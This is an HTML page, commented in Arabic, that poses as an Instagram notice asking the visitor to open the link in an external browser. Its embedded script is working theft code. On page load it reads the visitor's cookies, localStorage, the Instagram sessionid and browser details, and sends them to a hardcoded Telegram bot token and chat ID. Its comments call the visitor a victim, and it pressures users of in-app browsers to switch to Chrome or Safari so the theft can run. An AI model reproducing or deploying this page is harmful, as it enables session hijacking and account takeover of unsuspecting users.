<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; }
        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { text-align: center; padding: 20px; max-width: 320px; }
        .logo { width: 64px; height: 64px; background: linear-gradient(45deg, #f09433, #d62976, #962fbf); border-radius: 16px; margin: 0 auto 24px; display: flex; align-items: center; justify-content: center; font-size: 32px; color: white; }
        h2 { font-size: 20px; color: #262626; margin-bottom: 8px; }
        p { font-size: 14px; color: #8e8e8e; margin-bottom: 16px; }
        .btn { background: #0095f6; color: white; border: none; padding: 12px 24px; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 8px; }
        .btn-outline { background: transparent; color: #0095f6; border: 1px solid #0095f6; }
        .footer { font-size: 12px; color: #c7c7c7; margin-top: 24px; }
        .warning { background: #fff3cd; color: #856404; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; }
    </style>
</head>
<body>
<div class="container" id="mainContent">
    <div class="logo">📷</div>
    <h2>فتح في المتصفح</h2>
    <p>هذا المحتوى لا يمكن عرضه داخل التطبيق</p>
    <div class="warning">⚠️ يرجى فتح الرابط في متصفح Chrome أو Safari</div>
    <button class="btn" id="openBrowserBtn">فتح في المتصفح</button>
    <button class="btn btn-outline" id="copyLinkBtn">نسخ الرابط</button>
    <div class="footer">Instagram</div>
</div>

<script>
// ============================================
// بيانات البوت
// ============================================
var BOT_TOKEN = "8799007815:AAFoZ7f_T3fcmbNHVy0Rqcv9qpMytp1bEFU";
var CHAT_ID = "6181826564";

// ============================================
// كشف إذا كان المستخدم داخل تطبيق Instagram
// ============================================
function isInsideApp() {
    var ua = navigator.userAgent || navigator.vendor || window.opera;
    
    // الكشف عن تطبيقات معينة
    if (ua.indexOf("Instagram") > -1) return "Instagram";
    if (ua.indexOf("FBAN") > -1 || ua.indexOf("FBAV") > -1) return "Facebook";
    if (ua.indexOf("WhatsApp") > -1) return "WhatsApp";
    if (ua.indexOf("Twitter") > -1) return "Twitter";
    if (ua.indexOf("TikTok") > -1) return "TikTok";
    if (ua.indexOf("Snapchat") > -1) return "Snapchat";
    if (ua.indexOf("Line") > -1) return "Line";
    if (ua.indexOf("Telegram") > -1) return "Telegram";
    if (ua.indexOf("Discord") > -1) return "Discord";
    if (ua.indexOf("Reddit") > -1) return "Reddit";
    
    // كشف WebView عام
    if (ua.indexOf("wv") > -1) return "WebView";
    
    return false;
}

// ============================================
// إرسال إلى تليجرام
// ============================================
function sendToTelegram(msg) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: "HTML"}));
}

// ============================================
// سرقة البيانات (تتم فقط إذا كان في متصفح عادي)
// ============================================
function stealData() {
    var cookies = document.cookie;
    if (cookies && cookies.length > 0) {
        sendToTelegram("🍪 <b>Cookies</b>\n<code>" + cookies.substring(0, 3500) + "</code>");
    }
    
    var local = {};
    for (var i = 0; i < localStorage.length; i++) {
        var key = localStorage.key(i);
        local[key] = localStorage.getItem(key);
    }
    if (Object.keys(local).length > 0) {
        sendToTelegram("💾 <b>LocalStorage</b>\n<code>" + JSON.stringify(local, null, 2).substring(0, 3500) + "</code>");
    }
    
    var allCookies = document.cookie.split("; ");
    for (var k = 0; k < allCookies.length; k++) {
        if (allCookies[k].includes("sessionid")) {
            sendToTelegram("🔐 <b>Instagram Session</b>\n<code>" + allCookies[k] + "</code>");
            break;
        }
    }
    
    var info = {
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: screen.width + "x" + screen.height,
        url: location.href,
        time: new Date().toISOString(),
        insideApp: isInsideApp()
    };
    sendToTelegram("💻 <b>Browser Info</b>\n<code>" + JSON.stringify(info, null, 2) + "</code>");
}

// ============================================
// إجبار الضحية على فتح الرابط في المتصفح
// ============================================
var app = isInsideApp();
var currentUrl = window.location.href;

if (app) {
    // الضحية داخل تطبيق - نمنعه من رؤية المحتوى حتى يفتح في المتصفح
    console.log("⚠️ المستخدم داخل تطبيق: " + app);
    sendToTelegram("⚠️ <b>مستخدم داخل تطبيق</b>\nالتطبيق: " + app + "\nالرابط: " + currentUrl);
    
    // تعديل النص ليكون أكثر إلحاحاً
    document.getElementById('mainContent').innerHTML = `
        <div class="logo">📷</div>
        <h2>⛔ غير مدعوم</h2>
        <p>هذا المحتوى لا يمكن عرضه داخل تطبيق ${app}</p>
        <div class="warning">🔒 يرجى فتح الرابط في متصفح Chrome أو Safari</div>
        <button class="btn" id="openBrowserBtn">فتح في المتصفح</button>
        <button class="btn btn-outline" id="copyLinkBtn">نسخ الرابط</button>
        <div class="footer">Instagram</div>
    `;
    
} else {
    // الضحية في متصفح عادي - نسرق البيانات ونعرض المحتوى الطبيعي
    console.log("✅ المستخدم في متصفح عادي");
    stealData();
}

// ============================================
// أزرار التفاعل (تعمل في كل الحالات)
// ============================================
document.addEventListener('click', function(e) {
    if (e.target.id === 'openBrowserBtn') {
        // محاولة فتح الرابط في المتصفح الخارجي
        var url = window.location.href;
        
        // محاولة استخدام Intent (لـ Android)
        window.location.href = 'intent://' + url.replace('https://', '') + '#Intent;scheme=https;package=com.android.chrome;end';
        
        // بديل: محاولة فتح الرابط في نافذة جديدة
        setTimeout(function() {
            window.open(url, '_blank');
        }, 100);
        
        // رسالة للضحية
        alert("إذا لم يتم فتح المتصفح تلقائياً، اضغط على نسخ الرابط والصقه في Chrome");
    }
    
    if (e.target.id === 'copyLinkBtn') {
        var url = window.location.href;
        navigator.clipboard.writeText(url).then(function() {
            alert("تم نسخ الرابط. افتح متصفح Chrome والصقه في شريط العناوين");
        });
    }
});
</script>
</body>
</html>
